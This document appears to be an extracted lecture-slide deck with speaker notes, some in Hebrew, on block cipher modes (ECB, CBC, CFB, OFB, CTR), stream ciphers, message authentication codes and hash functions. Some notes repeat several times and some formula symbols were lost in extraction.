AES is now widely available in commercial products. 
Symmetric Encryption Types
Block Cipher
Processes the input one block of elements at a time and produces an output block for each input block.
Implemented via different modes.
Stream cipher
Encrypts plaintext one byte at a time (also other units) 
Processes the input elements continuously

35

36
Modes of Operation [612]
36

37
36

A symmetric block cipher processes one block of data at a time. In the case of DES
and 3DES, the block length is 64 bits. For longer amounts of plaintext, it is necessary
to break the plaintext into 64-bit blocks (padding the last block if necessary).
To apply a block cipher in a variety of applications, five modes of operation have been defined by NIST (Special Publication 800-38A). The five modes are intended
to cover virtually all the possible applications of encryption for which a block cipher
could be used. These modes are intended for use with any symmetric block cipher,
including triple DES and AES. The modes are summarized in Table 20.4 , and the
most important are described briefly in the remainder of this section.

Block Cipher Encryption
Processes the input one block of elements at a time and produces an output block for each input block
Plaintext is handled using Electronic Code Book (ECB)  
For lengthy messages ECB mode is not secure especially if:
it is known that messages starts with certain predefined fields
keys are being reused
37

38
37

The ECB mode. A plaintext of length nb is divided into n b-bit blocks (P1, P2,c,Pn).
Each block is encrypted using the same algorithm and the same encryption key, to
produce a sequence of n b-bit blocks of ciphertext (C1, C2,c,Cn).
Practical Security Issues
Typically symmetric encryption is applied to a unit of data larger than a single 64-bit or 128-bit block

Electronic codebook (ECB) mode is the simplest approach to multiple-block encryption
each block of plaintext is encrypted using the same key
cryptanalysts may be able to exploit regularities in the plaintext

Modes of operation
Alternative techniques developed to increase the security of symmetric block encryption for large sequences
Overcomes the weaknesses of ECB
To increase security for lengthy messages we use Stream Cipher
38

39

Typically, symmetric encryption is applied to a unit of data larger than a single 64-bit or 128-bit block. E-mail messages, network
packets, database records, and other plaintext sources must be broken up into a series of fixed-length block for encryption by a symmetric block cipher. The simplest approach to multiple-block encryption is known as electronic codebook (ECB)
mode, in which plaintext is handled b bits at a time and each block of plaintext is encrypted using the same key. Typically b  64 or b  128

For lengthy messages, the ECB mode may not be secure. A cryptanalyst may be able to exploit regularities in the plaintext to ease the task of decryption. For
example, if it is known that the message always starts out with certain predefined fields, then the cryptanalyst may have a number of known plaintext-ciphertext pairs to work with.

To increase the security of symmetric block encryption for large sequences of data, a number of alternative techniques have been developed, called modes of
operation. These modes overcome the weaknesses of ECB; each mode has its own particular advantages.
38
Electronic Codebook (ECB)
Simplest mode

Plaintext is handled b bits at a time and each block is encrypted using the same key

“codebook” because have unique ciphertext value for each plaintext block


39

40
39

The simplest way to proceed is what is known as electronic codebook (ECB) mode,
in which plaintext is handled b bits at a time and each block of plaintext is encrypted
using the same key ( Figure 2.3a ). The term codebook is used because, for a given
key, there is a unique ciphertext for every b -bit block of plaintext. Therefore, one
can imagine a gigantic codebook in which there is an entry for every possible b -bit
plaintext pattern showing its corresponding ciphertext.

With ECB, if the same b -bit block of plaintext appears more than once in
the message, it always produces the same ciphertext. Because of this, for lengthy
messages, the ECB mode may not be secure. If the message is highly structured,
it may be possible for a cryptanalyst to exploit these regularities. For example, if
it is known that the message always starts out with certain predefined fields, then
the cryptanalyst may have a number of known plaintext-ciphertext pairs to work
with. If the message has repetitive elements, with a period of repetition a multiple
of b bits, then these elements can be identified by the analyst. This may help in the
analysis or may provide an opportunity for substituting or rearranging blocks.

To overcome the security deficiencies of ECB, we would like a technique in
which the same plaintext block, if repeated, produces different ciphertext blocks.

Electronic Codebook (ECB)
40

41
ECB Analysis
Security:
EFB is not secure, since repeated plaintext is seen in repeated ciphertext
A typical example of this weakness is by encoding a bitmap image – as can be noticed, ECB mode cannot blur the plaintext.


41

42
ECB Analysis
Speed: Each plaintext/ciphertext block is encrypted/decrypted separately. Thus, it is possible to encrypt and decrypt by using many threads simultaneously.
Effect of an error: Each plaintext/ ciphertext block is encrypted/decrypted separately. Thus, an error in one block does not affect other blocks.
Reoccurrences of key:  the same key are used for all encryption and decryption blocks. 

42

43
Cipher Block Chaining (CBC)
43

44
43

In the cipher block chaining (CBC) mode (Figure 20.6), the input to the encryption algorithm is the XOR of the current plaintext block and the preceding ciphertext block; the same key is used for each block. In effect, we have chained together the processing of the sequence of plaintext blocks. The input to the encryption function for each plaintext block bears no fixed relationship to the plaintext block. Therefore, repeating patterns of b bits are not exposed. CBC is widely used in security applications.

For decryption, each cipher block is passed through the decryption algorithm. The result is XORed with the preceding ciphertext block to produce the plaintext block. To see that this works, we can write:
Cj = E(K, [Cj–1  Pj])
where E[K, X] is the encryption of plaintext X using key K, and  is the exclusive-OR operation.
To produce the first block of ciphertext, an initialization vector (IV) is XORed with the first block of plaintext. On decryption, the IV is XORed with the output of the decryption algorithm to recover the first block of plaintext.

The IV must be known to both the sender and receiver. For maximum security, the IV should be protected as well as the key. This could be done by sending the IV using ECB encryption. One reason for protecting the IV is as follows: If an opponent is able to fool the receiver into using a different value for IV, then the opponent is able to invert selected bits in the first block of plaintext.
CBC Analysis
Security: the CBC mode is secure, repeated plaintext will not be seen in repeated ciphertext.
Reoccurrences of key:  the same key are used for all encryption and decryption blocks.
Speed: 
Encryption: Each ciphertext block depends on the previous one. Thus, encryption in CBC mode can only be performed by using one thread. 
Decryption: Because the receiver knows all the ciphertext blocks just after obtaining the encrypted message, he can decrypt the message using many threads simultaneously.
44

45
CBC Analysis
Effect of an error: 
Encryption: If one bit of a plaintext message is damaged (for example because of some earlier transmission error), all subsequent ciphertext blocks will be damaged and it will be never possible to decrypt the ciphertext received from this plaintext. 
Decryption: If one ciphertext bit is damaged, only two received plaintext blocks will be damaged. It might be possible to recover the data.

45

46
Cipher Feedback (CFB)
46

47
46

It is possible to convert any block cipher into a stream cipher by using the cipher feedback (CFB) mode. A stream cipher eliminates the need to pad a message to be an integral number of blocks. It also can operate in real time. Thus, if a character stream is being transmitted, each character can be encrypted and transmitted immediately using a character-oriented stream cipher. One desirable property of a stream cipher is that the ciphertext be of the same length as the plaintext. 

Figure 20.7 depicts the CFB scheme. In the figure, it is assumed that the unit of transmission is s bits; a common value is s = 8. As with CBC, the units of plaintext are chained together.
For encryption, the input to the encryption function is a b-bit shift register that is initially set to some initialization vector (IV). The leftmost (most significant) s bits of the output of the encryption function are XORed with the first unit of plaintext P1 to produce the first unit of ciphertext C1, which is then transmitted. In addition, the contents of the shift register are shifted left by s bits and C1 is placed in the rightmost (least significant) s bits of the shift register. This process continues until all plaintext units have been encrypted. Will have:
C1 = P1  Ss[E(K, IV)]
For decryption, the same scheme is used, except that the received ciphertext unit is XORed with the output of the encryption function to produce the plaintext unit. Note that it is the encryption function that is used, not the decryption function. This is easily explained. Let Ss(X) be defined as the most significant s bits of X. Then have
P1 = C1  Ss[E(K, IV)]
CFB Analysis
Security: The CFB mode is similar to CBC. The main difference is that one should encrypt ciphertext data from the previous round and then add the output to the plaintext bits. It does not affect the cipher security but it results in the fact that the same encryption algorithm should be used during the decryption process.
47

48
CFB Analysis
Reoccurrences of key:  the same key are used for all encryption and decryption blocks.
Speed: 
Encryption: Encryption in CFB mode can be performed only by using one thread.
Decryption: As in CBC mode, one can decrypt ciphertext blocks using many threads simultaneously. 
48

49
CFB Analysis
Effect of an error: 
Encryption: If one bit of a plaintext message is damaged, the corresponding ciphertext block and all subsequent ciphertext blocks will be damaged.
Decryption: If one ciphertext bit is damaged, only two received plaintext blocks will be damaged.
49

50
Output Feedback (OFB)
50


51
OFB Analysis
Security: The biggest drawback of OFB is that the repetition of encrypting the initialization vector may produce the same state that has occurred before. It is an unlikely situation but in such a case the plaintext will start to be encrypted by the same data as previously.
Reoccurrences of key:  Algorithms that work in the OFB mode create keystream bits that are used for encryption subsequent data blocks. In this regard, the way of working of the block cipher becomes similar to the way of working of a typical stream cipher.
51

52
OFB Analysis
Speed: Because of the continuous creation of keystream bits, both encryption and decryption can be performed using only one thread at a time. Similarly, as in the CFB mode, both data encryption and decryption uses the same cipher encryption algorithm.
Effect of an error: If one bit of a plaintext or ciphertext message is damaged (for example because of a transmission error), only one corresponding ciphertext or respectively plaintext bit is damaged as well. It is possible to use various correction algorithms to restore the previous value of damaged parts of the received message.
52

53
Counter (CTR)
53

54
53

Although interest in the counter mode (CTR) has increased recently, with applications to ATM network security and IPSec), this mode was proposed early

Figure 20.8 depicts the CTR mode. A counter, equal to the plaintext block size is used. The only requirement stated in SP 800-38A is that the counter value must be different for each plaintext  block that is encrypted. Typically, the counter is initialized to some value and then incremented by 1 for each subsequent block (modulo 2b, where b is the block size). For encryption, the counter is encrypted and then XORed with the plaintext block to produce the ciphertext block; there is no chaining. For decryption, the same sequence of counter values is used, with each encrypted counter XORed with a ciphertext block to recover the corresponding plaintext block.

Some advantages of CTR mode are :

• Hardware efficiency: CTR mode can be done in parallel on multiple blocks of plaintext or ciphertext. 

• Software efficiency: have opportunities for parallel execution in CTR mode.

• Preprocessing: can be used to prepare the output of the encryption boxes that feed into the XOR functions in Figure 20.8. 

• Random access: The ith block of plaintext or ciphertext can be processed in random-access fashion. 

• Provable security: CTR is at least as secure as the other mode.

• Simplicity: CTR mode oly needs the implementation of the encryption algorithm.
CTR Analysis
Security: In this mode, subsequent values of an increasing counter are added to a nonce value (the nonce means a number that is unique: number used once) and the results are encrypted as usual. The nonce plays the same role as initialization vectors.
Reoccurrences of key: Using the CTR mode makes block cipher way of working similar to a stream cipher. As in the OFB mode, keystream bits are created regardless of content of encrypting data blocks. 

54

55
CTR Analysis
Speed: It is one of the most popular block ciphers modes of operation. Both encryption and decryption can be performed using many threads at the same time.
Effect of an error: If one bit of a plaintext or ciphertext message is damaged, only one corresponding output bit is damaged as well. Thus, it is possible to use various correction algorithms to restore the previous value of damaged parts of received messages.

55

56
Stream Cipher Encryption – RC4
Encrypts plaintext one byte at a time (also other units) 
Produces output one element at a time
Processes the input elements continuously
56

57
56

Diagram of stream cipher structure. In this structure a key is input to a pseudorandom bit generator that produces a stream of 8-bit numbers that are apparently random. A pseudorandom stream is one that is unpredictable without knowledge of the input key and which has an apparently random character.
The output of the generator, called a keystream, is combined one byte at a time with the plaintext stream using the bitwise exclusive-OR (XOR) operation.



Stream Cipher Encryption – RC4
Almost always faster 
Pseudorandom stream is one that is unpredictable without knowledge of the input key
Keys cannot be reused
Generate pseudo random keys 
(key Stream)
57

58
57

Diagram of stream cipher structure. In this structure a key is input to a pseudorandom bit generator that produces a stream of 8-bit numbers that are apparently random. A pseudorandom stream is one that is unpredictable without knowledge of the input key and which has an apparently random character.
The output of the generator, called a keystream, is combined one byte at a time with the plaintext stream using the bitwise exclusive-OR (XOR) operation.



Message Confidentiality
 
VS 

Message Authentication
58

59
58


Message Authentication
Protects against active attacks
Verifies that the received message is authentic
content have not been altered
from authentic source
timely and in correct sequence
can use conventional (Symmetric) encryption
Only sender and receiver share a key
59

60
59


התקפה פאסיבית היא כזו של האזנה וציתות למסרים ומידע שמועבר.

כאן נרצה גם להגן מפני התקפות אקטיביות,

הרעיון הוא אימות הודעות ותכנים, המטרות לאמת ש:

המידע לא שונה בדרך
המידע הוא אכן מהמקור שאנחנו מצפים לקבל ממנו
המידע הגיע בזמן (ולא אחרי שנה) ובסדר הנכון

Encryption protects against passive attack (eavesdropping).
A different requirement is to protect against active attack (falsification of data and transactions). 
Protection against such attacks is known as message or data authentication.

A message, file, document, or other collection of data is said to be authentic when it is genuine and came from its alleged source. 
Message or data authentication is a procedure that allows communicating parties to verify that received or stored messages are authentic. 
The two important aspects are to verify that the contents of the message have not been altered and that the source is authentic. 
We may also wish to verify a message’s timeliness (it has not been artificially delayed and replayed) and sequence relative to other messages flowing between two parties. All of these concerns come under the category of data integrity.

It would seem possible to perform authentication simply by the use of symmetric encryption. 
If we assume that only the sender and receiver share a key (which is as it should be), then only the genuine sender would be able to encrypt a message
successfully for the other participant, provided the receiver can recognize a valid message.
Furthermore, if the message includes an error-detection code and a sequence number, the receiver is assured that no alterations have been made and that sequencing is proper. 
If the message also includes a timestamp, the receiver is assured that the message has not been delayed beyond that normally expected for network transit.

In fact, symmetric encryption alone is not a suitable tool for data authentication.
To give one simple example, in the ECB mode of encryption, if an attacker reorders the blocks of ciphertext, then each block will still decrypt successfully.
However, the reordering may alter the meaning of the overall data sequence.
Although sequence numbers may be used at some level (e.g., each IP packet), it is typically not the case that a separate sequence number will be associated with each b-bit block of plaintext. Thus, block reordering is a threat.
Message Authentication without Encryption
Symmetric Encryption only for message authentication is exposed to Block reorder attack (e.g in ECB)
Thus using a generated tag and appending it to each message protect from this attack as well:
Message Authentication Code
One Way Hash Function
60

61
60


התקפה פאסיבית היא כזו של האזנה וציתות למסרים ומידע שמועבר.

כאן נרצה גם להגן מפני התקפות אקטיביות,

הרעיון הוא אימות הודעות ותכנים, המטרות לאמת ש:

המידע לא שונה בדרך
המידע הוא אכן מהמקור שאנחנו מצפים לקבל ממנו
המידע הגיע בזמן (ולא אחרי שנה) ובסדר הנכון

Encryption protects against passive attack (eavesdropping).
A different requirement is to protect against active attack (falsification of data and transactions). 
Protection against such attacks is known as message or data authentication.

A message, file, document, or other collection of data is said to be authentic when it is genuine and came from its alleged source. 
Message or data authentication is a procedure that allows communicating parties to verify that received or stored messages are authentic. 
The two important aspects are to verify that the contents of the message have not been altered and that the source is authentic. 
We may also wish to verify a message’s timeliness (it has not been artificially delayed and replayed) and sequence relative to other messages flowing between two parties. All of these concerns come under the category of data integrity.

It would seem possible to perform authentication simply by the use of symmetric encryption. 
If we assume that only the sender and receiver share a key (which is as it should be), then only the genuine sender would be able to encrypt a message
successfully for the other participant, provided the receiver can recognize a valid message.
Furthermore, if the message includes an error-detection code and a sequence number, the receiver is assured that no alterations have been made and that sequencing is proper. 
If the message also includes a timestamp, the receiver is assured that the message has not been delayed beyond that normally expected for network transit.

In fact, symmetric encryption alone is not a suitable tool for data authentication.
To give one simple example, in the ECB mode of encryption, if an attacker reorders the blocks of ciphertext, then each block will still decrypt successfully.
However, the reordering may alter the meaning of the overall data sequence.
Although sequence numbers may be used at some level (e.g., each IP packet), it is typically not the case that a separate sequence number will be associated with each b-bit block of plaintext. Thus, block reordering is a threat.
Message Authentication Codes (MAC)
61
MACM = F(KAB,M)

62
61


למעשה היות והשולח והמקבל של המסרים המוצפנים חולקים את אותו מפתח סימטרי אזי ניתן להשתמש בסוד המשותף הזה גם כדי לאכוף אימות מסרים.

איך נעבוד כאן עם MAC?, 
נקח את ההודעה ונפעיל עליה algorithm MAC עם המפתח , 
מצרפים להודעה את הMAC ומעבירים לצד השני , 
הצד השני צריך להשוות את הMAC שהוא יוצר לMAC שהגיע עם ההודעה ואם לא זהים אז יש בעיה בהודעה. 



One authentication technique involves the use of a secret key to generate a small block of data, known as a message authentication code, that is appended to the message. 
This technique assumes that two communicating parties, say A and B, share a common secret key KAB. 
When A has a message to send to B, it calculates the message authentication code as a complex function of the message and the key: MACM  F(KAB, M). 
The message plus code are transmitted to the intended recipient. 
The recipient performs the same calculation on the received message, using the same secret key, to generate a new message authentication code. 
The received code is compared to the calculated code). 
If we assume that only the receiver and the sender know the identity of the secret key, and if the received code matches the calculated code, then

1. The receiver is assured that the message has not been altered. If an attacker alters the message but does not alter the code, then the receiver’s calculation of the code will differ from the received code. Because the attacker is assumed not to know the secret key, the attacker cannot alter the code to correspond to the alterations in the message.

2. The receiver is assured that the message is from the alleged sender. Because no one else knows the secret key, no one else could prepare a message with a proper code.

3. If the message includes a sequence number (such as is used with X.25, HDLC, and TCP), then the receiver can be assured of the proper sequence, because an attacker cannot successfully alter the sequence number.

A number of algorithms could be used to generate the code. The NIST specification, FIPS PUB 113, recommends the use of DES. DES is used to generate an
encrypted version of the message, and the last number of bits of ciphertext are used as the code. A 16- or 32-bit code is typical.

The process just described is similar to encryption. One difference is that the authentication algorithm need not be reversible, as it must for decryption. It turns
out that because of the mathematical properties of the authentication function, it is less vulnerable to being broken than encryption.
Message Authentication Codes (MAC)
Only the sender and receiver share the secret key KAB

If the sender find a match between the received MAC and his calculated code then:
Message wasn’t altered: attacker can alter the message but not the code since doesn’t have the secret key
Sender authenticity –no one else is able to produce the same MAC due to the secret key
Message on correct order  - attacker cannot alter the sequence number (X.25,HDLC, TCP) within a message
Note that MAC algorithms are not required to be reversible
62

63
62


התקפה פאסיבית היא כזו של האזנה וציתות למסרים ומידע שמועבר.

כאן נרצה גם להגן מפני התקפות אקטיביות,

הרעיון הוא אימות הודעות ותכנים, המטרות לאמת ש:

המידע לא שונה בדרך
המידע הוא אכן מהמקור שאנחנו מצפים לקבל ממנו
המידע הגיע בזמן (ולא אחרי שנה) ובסדר הנכון

Encryption protects against passive attack (eavesdropping).
A different requirement is to protect against active attack (falsification of data and transactions). 
Protection against such attacks is known as message or data authentication.

A message, file, document, or other collection of data is said to be authentic when it is genuine and came from its alleged source. 
Message or data authentication is a procedure that allows communicating parties to verify that received or stored messages are authentic. 
The two important aspects are to verify that the contents of the message have not been altered and that the source is authentic. 
We may also wish to verify a message’s timeliness (it has not been artificially delayed and replayed) and sequence relative to other messages flowing between two parties. All of these concerns come under the category of data integrity.

It would seem possible to perform authentication simply by the use of symmetric encryption. 
If we assume that only the sender and receiver share a key (which is as it should be), then only the genuine sender would be able to encrypt a message
successfully for the other participant, provided the receiver can recognize a valid message.
Furthermore, if the message includes an error-detection code and a sequence number, the receiver is assured that no alterations have been made and that sequencing is proper. 
If the message also includes a timestamp, the receiver is assured that the message has not been delayed beyond that normally expected for network transit.

In fact, symmetric encryption alone is not a suitable tool for data authentication.
To give one simple example, in the ECB mode of encryption, if an attacker reorders the blocks of ciphertext, then each block will still decrypt successfully.
However, the reordering may alter the meaning of the overall data sequence.
Although sequence numbers may be used at some level (e.g., each IP packet), it is typically not the case that a separate sequence number will be associated with each b-bit block of plaintext. Thus, block reordering is a threat.
One-Way Hash Function
63
One way since it is not reversible

M message with variable length

H – one way hash function

H does not use a secret key

H(M) – fixed message digest that is added to the original message

We add to H(M) the length of the original message in bits

Hash is more lightweight than MAC
Sender authenticity is not guaranteed



64
63


שיטה נוספת לאימות מסרים היא להשתמש בhash:
ניקח את ההודעה
נדרוש מhash שיעבוד על הודעה בכל אורך , 
מוסיפים תוספת שהיא אורך ההודעה , 
נפעיל פונקציית hash על ההודעה , 
מקבלים תוצאה שאותה מצרפים להודעה עצמה. 
מה משיגים עם פונקצייה כזו? היא לא הפיתרון הכי טוב , התוקף יוכל לשנות את כל ההודעה כולל פונקציית הhash.

ב  hashאין סוד שעובר, מניחים שכולם יודעים את פונקציית ההאש, ניתן להשתמש בו כדי לבדוק האם היו בעיות במהלך מעבר ההודעה.

An alternative to the message authentication code is the one-way hash function.
As with the message authentication code, a hash function accepts a variable-size message M as input and produces a fixed-size message digest
H(M) as output. 
Typically, the message is padded out to an integer multiple of some fixed length (e.g., 1024 bits) and the padding includes the value of the length
of the original message in bits. 
The length field is a security measure to increase the difficulty for an attacker to produce an alternative message with the same hash value.
We encrypt the digest only using the symmetric key
64
Message Authentication Using a One-Way Hash Function – HMAC
(MD2, MD4, MD5, SHA-1(160)/256/512)  [53]


65
64

Unlike the MAC, a hash function does not also take a secret key as input.
To authenticate a message, the message digest is sent with the message in such a way that the message digest is authentic.
The Figure illustrates three ways in which the message can be authenticated using a hash code. 
The message digest can be encrypted using symmetric encryption (part a); if it is assumed that only the sender and receiver share the encryption key, then authenticity is assured. 
The message digest can also be encrypted using public-key encryption (part b).
The public-key approach has two advantages: It provides a digital signature as well as message authentication; and it does not require the
distribution of keys to communicating parties.

These two approaches have an advantage over approaches that encrypt the entire message in that less computation is required. But an even more common approach is  the use of a technique that avoids encryption altogether. Several reasons
for this interest are pointed out in [TSUD92]:

• Encryption software is quite slow. Even though the amount of data to be
encrypted per message is small, there may be a steady stream of messages into
and out of a system.

• Encryption hardware costs are non-negligible. Low-cost chip implementations
of DES are available, but the cost adds up if all nodes in a network must have
this capability.

• Encryption hardware is optimized toward large data sizes. For small blocks of
data, a high proportion of the time is spent in initialization/invocation overhead.

• An encryption algorithm may be protected by a patent.

Figure 2.6c shows a technique that uses a hash function but no encryption for message authentication. 
This technique, known as a keyed hash MAC, assumes that two communicating parties, say A and B, share a common secret key K.
This secret key is incorporated into the process of generating a hash code. In the
approach illustrated in Figure 2.6c, when A has a message to send to B, it calculates
the hash function over the concatenation of the secret key and the message:
MDM = H(KMK).6 It then sends [ MMDM] to B. Because B possesses K, it can
recompute H(K7M7K) and verify MDM. Because the secret key itself is not sent, it
should not be possible for an attacker to modify an intercepted message. As long as
the secret key remains secret, it should not be possible for an attacker to generate a
false message.

Note that the secret key is used as both a prefix and a suffix to the message. If
the secret key is used as either only a prefix or only a suffix, the scheme is less secure.
This topic is discussed in Chapter 21. Chapter 21 also describes a scheme known
as HMAC, which is somewhat more complex than the approach of Figure 2.6c and
which has become the standard approach for a keyed hash MAC.
We encrypt the digest only using our private key
  - used as digital signature
  - no need for key distribution
65
Message Authentication Using a One-Way Hash Function – HMAC
(MD2, MD4, MD5, SHA-1(160)/256/512)  [53]


66
65

Unlike the MAC, a hash function does not also take a secret key as input.
To authenticate a message, the message digest is sent with the message in such a way that the message digest is authentic.
The Figure illustrates three ways in which the message can be authenticated using a hash code. 
The message digest can be encrypted using symmetric encryption (part a); if it is assumed that only the sender and receiver share the encryption key, then authenticity is assured. 
The message digest can also be encrypted using public-key encryption (part b).
The public-key approach has two advantages: It provides a digital signature as well as message authentication; and it does not require the
distribution of keys to communicating parties.

These two approaches have an advantage over approaches that encrypt the entire message in that less computation is required. But an even more common approach is  the use of a technique that avoids encryption altogether. Several reasons
for this interest are pointed out in [TSUD92]:

• Encryption software is quite slow. Even though the amount of data to be
encrypted per message is small, there may be a steady stream of messages into
and out of a system.

• Encryption hardware costs are non-negligible. Low-cost chip implementations
of DES are available, but the cost adds up if all nodes in a network must have
this capability.

• Encryption hardware is optimized toward large data sizes. For small blocks of
data, a high proportion of the time is spent in initialization/invocation overhead.

• An encryption algorithm may be protected by a patent.

Figure 2.6c shows a technique that uses a hash function but no encryption for message authentication. 
This technique, known as a keyed hash MAC, assumes that two communicating parties, say A and B, share a common secret key K.
This secret key is incorporated into the process of generating a hash code. In the
approach illustrated in Figure 2.6c, when A has a message to send to B, it calculates
the hash function over the concatenation of the secret key and the message:
MDM = H(KMK).6 It then sends [ MMDM] to B. Because B possesses K, it can
recompute H(K7M7K) and verify MDM. Because the secret key itself is not sent, it
should not be possible for an attacker to modify an intercepted message. As long as
the secret key remains secret, it should not be possible for an attacker to generate a
false message.

Note that the secret key is used as both a prefix and a suffix to the message. If
the secret key is used as either only a prefix or only a suffix, the scheme is less secure.
This topic is discussed in Chapter 21. Chapter 21 also describes a scheme known
as HMAC, which is somewhat more complex than the approach of Figure 2.6c and
which has become the standard approach for a keyed hash MAC.
We use secret value K that is agreed on the sender and receiver, the secret is not sent therefore it is difficult for an attacker to create H(m)

66
Message Authentication Using a One-Way Hash Function – HMAC
(MD2, MD4, MD5, SHA-1(160)/256/512)  [53]


67
66

Unlike the MAC, a hash function does not also take a secret key as input.
To authenticate a message, the message digest is sent with the message in such a way that the message digest is authentic.
The Figure illustrates three ways in which the message can be authenticated using a hash code. 
The message digest can be encrypted using symmetric encryption (part a); if it is assumed that only the sender and receiver share the encryption key, then authenticity is assured. 
The message digest can also be encrypted using public-key encryption (part b).
The public-key approach has two advantages: It provides a digital signature as well as message authentication; and it does not require the
distribution of keys to communicating parties.

These two approaches have an advantage over approaches that encrypt the entire message in that less computation is required. But an even more common approach is  the use of a technique that avoids encryption altogether. Several reasons
for this interest are pointed out in [TSUD92]:

• Encryption software is quite slow. Even though the amount of data to be
encrypted per message is small, there may be a steady stream of messages into
and out of a system.

• Encryption hardware costs are non-negligible. Low-cost chip implementations
of DES are available, but the cost adds up if all nodes in a network must have
this capability.

• Encryption hardware is optimized toward large data sizes. For small blocks of
data, a high proportion of the time is spent in initialization/invocation overhead.

• An encryption algorithm may be protected by a patent.

Figure 2.6c shows a technique that uses a hash function but no encryption for message authentication. 
This technique, known as a keyed hash MAC, assumes that two communicating parties, say A and B, share a common secret key K.
This secret key is incorporated into the process of generating a hash code. In the
approach illustrated in Figure 2.6c, when A has a message to send to B, it calculates
the hash function over the concatenation of the secret key and the message:
MDM = H(KMK).6 It then sends [ MMDM] to B. Because B possesses K, it can
recompute H(K7M7K) and verify MDM. Because the secret key itself is not sent, it
should not be possible for an attacker to modify an intercepted message. As long as
the secret key remains secret, it should not be possible for an attacker to generate a
false message.

Note that the secret key is used as both a prefix and a suffix to the message. If
the secret key is used as either only a prefix or only a suffix, the scheme is less secure.
This topic is discussed in Chapter 21. Chapter 21 also describes a scheme known
as HMAC, which is somewhat more complex than the approach of Figure 2.6c and
which has become the standard approach for a keyed hash MAC.
Hash Function Requirements
Can be applied to a block of data of any size
Produces a fixed-length output
H(x) is relatively easy to compute for any given x
One-way or pre-image resistant
computationally infeasible to find x such that H(x) = h
67

68
67

The purpose of a hash function is to produce a
“fingerprint” of a file, message, or other block of data. To be useful for message
authentication, a hash function H must have the following properties:
1. H can be applied to a block of data of any size.
2. H produces a fixed-length output.
3. H(x) is relatively easy to compute for any given x, making both hardware and
software implementations practical.
4. For any given code h, it is computationally infeasible to find x such that
H(x)  h. A hash function with this property is referred to as one-way or preimage
resistant.
5. For any given block x, it is computationally infeasible to find y  x with
H(y)  H(x). A hash function with this property is referred to as second preimage
resistant. This is sometimes referred to as weak collision resistant.
6. It is computationally infeasible to find any pair (x, y) such that H(x)  H(y).
A hash function with this property is referred to as collision resistant. This is
sometimes referred to as strong collision resistant.
The first three properties are requirements for the practical application of a hash
function to message authentication.
The fourth property is the one-way property: It is easy to generate a code given a
message, but virtually impossible to generate a message given a code. This property is
important if the authentication technique involves the use of a secret value (Figure 2.6c).
The secret value itself is not sent; however, if the hash function is not one way, an attacker
can easily discover the secret value: If the attacker can observe or intercept a transmission,
the attacker obtains the message M and the hash code MDM  H(SAB || M). The attacker
then inverts the hash function to obtain SAB || M  H-1(MDM). Because the attacker now
has both M and SAB || M, it is a trivial matter to recover SAB.
The fifth property guarantees that it is impossible to find an alternative
message with the same hash value as a given message. This prevents forgery when
an encrypted hash code is used (Figures 2.6a and b). If this property were not true,
an attacker would be capable of the following sequence: First, observe or intercept
a message plus its encrypted hash code; second, generate an unencrypted hash code
from the message; third, generate an alternate message with the same hash code.
A hash function that satisfies the first five properties in the preceding list is
referred to as a weak hash function. If the sixth property is also satisfied, then it
is referred to as a strong hash function. A strong hash function protects against an
attack in which one party generates a message for another party to sign. For example,
suppose Bob gets to write an IOU message, send it to Alice, and she signs it.
Bob finds two messages with the same hash, one of which requires Alice to pay a
small amount and one that requires a large payment. Alice signs the first message
and Bob is then able to claim that the second message is authentic.
Hash Function Requirements
Second pre-image resistant or weak collision resistant
Given x, it computationally infeasible to find y ≠ x such that	H(y) = H(x)
Not alternative message can be found
Collision resistant or strong collision resistance (Strong Hash)
computationally infeasible to find any pair (x, y) such that H(x) = H(y)
68

69
68

The purpose of a hash function is to produce a
“fingerprint” of a file, message, or other block of data. To be useful for message
authentication, a hash function H must have the following properties:
1. H can be applied to a block of data of any size.
2. H produces a fixed-length output.
3. H(x) is relatively easy to compute for any given x, making both hardware and
software implementations practical.
4. For any given code h, it is computationally infeasible to find x such that
H(x)  h. A hash function with this property is referred to as one-way or preimage
resistant.
5. For any given block x, it is computationally infeasible to find y  x with
H(y)  H(x). A hash function with this property is referred to as second preimage
resistant. This is sometimes referred to as weak collision resistant.
6. It is computationally infeasible to find any pair (x, y) such that H(x)  H(y).
A hash function with this property is referred to as collision resistant. This is
sometimes referred to as strong collision resistant.
The first three properties are requirements for the practical application of a hash
function to message authentication.
The fourth property is the one-way property: It is easy to generate a code given a
message, but virtually impossible to generate a message given a code. This property is
important if the authentication technique involves the use of a secret value (Figure 2.6c).
The secret value itself is not sent; however, if the hash function is not one way, an attacker
can easily discover the secret value: If the attacker can observe or intercept a transmission,
the attacker obtains the message M and the hash code MDM  H(SAB || M). The attacker
then inverts the hash function to obtain SAB || M  H-1(MDM). Because the attacker now
has both M and SAB || M, it is a trivial matter to recover SAB.
The fifth property guarantees that it is impossible to find an alternative
message with the same hash value as a given message. This prevents forgery when
an encrypted hash code is used (Figures 2.6a and b). If this property were not true,
an attacker would be capable of the following sequence: First, observe or intercept
a message plus its encrypted hash code; second, generate an unencrypted hash code
from the message; third, generate an alternate message with the same hash code.
A hash function that satisfies the first five properties in the preceding list is
referred to as a weak hash function. If the sixth property is also satisfied, then it
is referred to as a strong hash function. A strong hash function protects against an
attack in which one party generates a message for another party to sign. For example,
suppose Bob gets to write an IOU message, send it to Alice, and she signs it.
Bob finds two messages with the same hash, one of which requires Alice to pay a
small amount and one that requires a large payment. Alice signs the first message
and Bob is then able to claim that the second message is authentic.
Security of Hash Functions
Two approaches to attacking a secure hash function:
Cryptanalysis
exploit logical weaknesses in the algorithm
Brute-force attack
strength of hash function depends solely on the length of the hash code produced by the algorithm

SHA (Secure hash function) most widely used hash algorithm – 160 bits
69

70
69

As with symmetric encryption, there are two
approaches to attacking a secure hash function: cryptanalysis and brute-force attack.
As with symmetric encryption algorithms, cryptanalysis of a hash function involves
exploiting logical weaknesses in the algorithm.
The strength of a hash function against brute-force attacks depends solely on
the length of the hash code produced by the algorithm.
For a hash code of length n,
the level of effort required is proportional to the following:
Preimage resistant 2n
Second preimage resistant 2n
Collision resistant 2n/2

If collision resistance is required (and this is desirable for a general-purpose
secure hash code), then the value 2n/2 determines the strength of the hash code against
brute-force attacks. Van Oorschot and Wiener [VANO94] pre sented a design for a
$10 million collision search machine for MD5, which has a 128-bit hash length, that
could find a collision in 24 days. Thus a 128-bit code may be viewed as inadequate.
The next step up, if a hash code is treated as a sequence of 32 bits, is a 160-bit hash
length. With a hash length of 160 bits, the same search machine would require over
four thousand years to find a collision. With today’s technology, the time would be
much shorter, so that 160 bits now appears suspect.

In recent years, the most widely used
hash function has been the Secure Hash Algorithm (SHA). SHA was developed
